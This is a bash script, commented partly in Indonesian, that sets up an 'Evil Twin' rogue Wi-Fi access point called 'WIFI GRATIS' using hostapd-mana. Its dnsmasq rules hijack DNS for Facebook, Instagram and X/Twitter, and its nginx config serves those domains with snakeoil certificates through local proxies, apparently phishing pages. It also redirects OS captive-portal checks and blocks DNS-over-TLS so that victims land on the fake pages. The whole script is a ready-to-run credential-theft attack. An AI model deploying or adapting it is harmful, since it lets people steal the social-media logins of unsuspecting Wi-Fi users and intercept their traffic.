#!/bin/bash
# ===============================================
# Evil Twin Captive Portal - One Click Script
# ===============================================

# 🔧 Konfigurasi (ubah sesuai kebutuhan)
AP_IFACE="wlx00c0cab84be1"   # Interface WiFi untuk AP
INTERNET_IFACE="wlan0"      # Interface untuk internet
AP_IP="192.168.15.1"
SUBNET="192.168.15.0/24"
TARGET_DIR="hostapd-mana"

# cek apakah folder ada
if [ -d "$TARGET_DIR" ]; then
  echo "✅ Folder '$TARGET_DIR' sudah ada, skip clone."
else
  echo "📥 Folder '$TARGET_DIR' belum ada, cloning repo..."
  git clone https://github.com/sensepost/hostapd-mana.git "$TARGET_DIR"
fi

chmod +x captive/setup.sh captive/start-server.sh
./captive/setup.sh && ./captive/start-server.sh

# ===============================================
# SETUP NETWORK
# ===============================================
echo "[*] Configuring network interface $AP_IFACE ..."
ip addr flush dev "$AP_IFACE"
ip addr add "$AP_IP/24" dev "$AP_IFACE"
ip link set "$AP_IFACE" up

# ===============================================
# CONFIG HOSTAPD
# ===============================================
cat > /etc/hostapd/hostapd.conf <<EOF
interface=$AP_IFACE
driver=nl80211
ssid=WIFI GRATIS
hw_mode=g
channel=6
auth_algs=1
wmm_enabled=1
ieee80211n=1
EOF

# ===============================================
# CONFIG DNSMASQ
# ===============================================
cat > /etc/dnsmasq.conf <<EOF
interface=$AP_IFACE
dhcp-range=192.168.15.50,192.168.15.150,12h
dhcp-option=3,$AP_IP
dhcp-option=6,$AP_IP
bind-interfaces
listen-address=$AP_IP
no-resolv
filterwin2k
bogus-priv
stop-dns-rebind

# Apple captive
address=/captive.apple.com/$AP_IP
address=/www.apple.com/$AP_IP
address=/apple.com/$AP_IP
address=/gsp1.apple.com/$AP_IP
address=/captive.g.aaplimg.com/$AP_IP

# Windows captive
address=/msftconnecttest.com/$AP_IP
address=/www.msftncsi.com/$AP_IP

# Firefox captive
address=/detectportal.firefox.com/$AP_IP

# Samsung captive
address=/connectivity.samsung.com/$AP_IP
address=/connectivitycheck.samsung.com/$AP_IP

# Android (beberapa biarkan ke DNS asli)
server=/clients3.google.com/8.8.8.8
server=/clients4.google.com/8.8.8.8
server=/connectivitycheck.android.com/8.8.8.8
server=/connectivitycheck.gstatic.com/8.8.8.8

# Social Media hijack
address=/facebook.com/$AP_IP
address=/www.facebook.com/$AP_IP
address=/instagram.com/$AP_IP
address=/www.instagram.com/$AP_IP
address=/twitter.com/$AP_IP
address=/x.com/$AP_IP

# Catch-all redirect
address=/#/$AP_IP
EOF

# ===============================================
# CONFIG IPTABLES
# ===============================================
echo "[*] Flushing and configuring iptables..."
echo 1 > /proc/sys/net/ipv4/ip_forward

iptables -F
iptables -t nat -F
iptables -X

iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT

iptables -t nat -A POSTROUTING -o "$INTERNET_IFACE" -j MASQUERADE
iptables -A FORWARD -i "$AP_IFACE" -o "$INTERNET_IFACE" -j ACCEPT
iptables -A FORWARD -i "$INTERNET_IFACE" -o "$AP_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT

iptables -A INPUT -i "$AP_IFACE" -p udp --dport 67:68 --sport 67:68 -j ACCEPT
iptables -A INPUT -i "$AP_IFACE" -p udp --dport 53 -j ACCEPT
iptables -A INPUT -i "$AP_IFACE" -p tcp --dport 53 -j ACCEPT
iptables -A INPUT -i "$AP_IFACE" -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -i "$AP_IFACE" -p tcp --dport 443 -j ACCEPT
iptables -I INPUT -i lo -j ACCEPT

iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 80 -j REDIRECT --to-ports 80
iptables -t nat -A PREROUTING -i "$AP_IFACE" -p udp --dport 53 -j REDIRECT --to-port 53
iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 53 -j REDIRECT --to-port 53

iptables -A FORWARD -i "$AP_IFACE" -p tcp --dport 853 -j REJECT --reject-with tcp-reset
iptables -A FORWARD -i "$AP_IFACE" -p udp --dport 853 -j REJECT

echo "[*] Captive portal iptables rules applied!"

cat > /etc/nginx/sites-available/default <<EOF
# Portal utama
server {
    listen 80;
    server_name 192.168.15.1 portal.local;

    root /var/www/html;
    index index.html;

    location / {
        try_files $uri $uri/ /index.html;
    }
}

# ===================== FACEBOOK =====================
server {
    listen 80;
    server_name facebook.com www.facebook.com m.facebook.com;

    location / {
        proxy_pass http://127.0.0.1:3000;
        include /etc/nginx/proxy_params;
    }
}

server {
    listen 443 ssl;
    server_name facebook.com www.facebook.com m.facebook.com;


    ssl_certificate     /etc/ssl/certs/ssl-cert-snakeoil.pem;
        ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;

    location / {
        proxy_pass http://127.0.0.1:3000;
        include /etc/nginx/proxy_params;
    }
}

# ===================== INSTAGRAM =====================
server {
    listen 80;
    server_name instagram.com www.instagram.com i.instagram.com;

    location / {
        proxy_pass http://127.0.0.1:3001;
        include /etc/nginx/proxy_params;
    }
}

server {
    listen 443 ssl;
    server_name instagram.com www.instagram.com i.instagram.com;


    ssl_certificate     /etc/ssl/certs/ssl-cert-snakeoil.pem;
        ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;

    location / {
        proxy_pass http://127.0.0.1:3001;
        include /etc/nginx/proxy_params;
    }
}

# ===================== X / TWITTER =====================
server {
    listen 80;
    server_name x.com www.x.com twitter.com www.twitter.com;

    location / {
        proxy_pass http://192.168.15.1:3002;
        include /etc/nginx/proxy_params;
    }
}

server {
    listen 443 ssl;
    server_name x.com www.x.com twitter.com www.twitter.com;


    ssl_certificate     /etc/ssl/certs/ssl-cert-snakeoil.pem;
        ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;

    location / {
        proxy_pass http://192.168.15.1:3002;
        include /etc/nginx/proxy_params;
    }
}

# ===================== CAPTIVE PORTAL DETECTION =====================
server {
    listen 80;
    server_name neverssl.com captive.apple.com www.apple.com
                connectivitycheck.gstatic.com connectivitycheck.android.com
                clients3.google.com msftconnecttest.com connectivity-check.ubuntu.com
                connectivity.samsung.com www.samsung.com www.msftncsi.com
                detectportal.firefox.com play.googleapis.com gstatic.com;

    location = /gen_204 {
        add_header Content-Type text/html;
        return 200 "<html><head><meta http-equiv='refresh' content='0; url=http://192.168.15.1/'></head></html>";
    }
    location = /ncsi.txt             { return 200 "Microsoft NCSI"; }
    location = /hotspot-detect.html  { return 302 http://192.168.15.1/; }
    location = /success.txt          { return 302 http://192.168.15.1/; }
    location /                       { return 302 http://192.168.15.1:3003/; }
}

# ===================== DEFAULT FALLBACK =====================
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name _;

    location / {
        proxy_pass http://192.168.15.1:3003;
        include /etc/nginx/proxy_params;
    }
}

EOF

# ===============================================
# START SERVICES
# ===============================================
CONFIG_FILE="/etc/hostapd/hostapd.conf"
EXECUTABLE="./hostapd-mana/hostapd/hostapd"

if [ ! -f "$CONFIG_FILE" ]; then
  echo "❌ File $CONFIG_FILE tidak ditemukan!"
  exit 1
fi

if [ ! -f "$EXECUTABLE" ]; then
  echo "❌ Executable hostapd-mana tidak ditemukan, pastikan sudah compile (make)."
  exit 1
fi

echo "[*] Stopping system hostapd (if running)..."
systemctl stop hostapd || true

echo "[*] Restarting dnsmasq & nginx..."
systemctl restart dnsmasq
systemctl restart nginx

echo "🚀 Menjalankan hostapd-mana dengan config $CONFIG_FILE ..."
sudo $EXECUTABLE -dd $CONFIG_FILE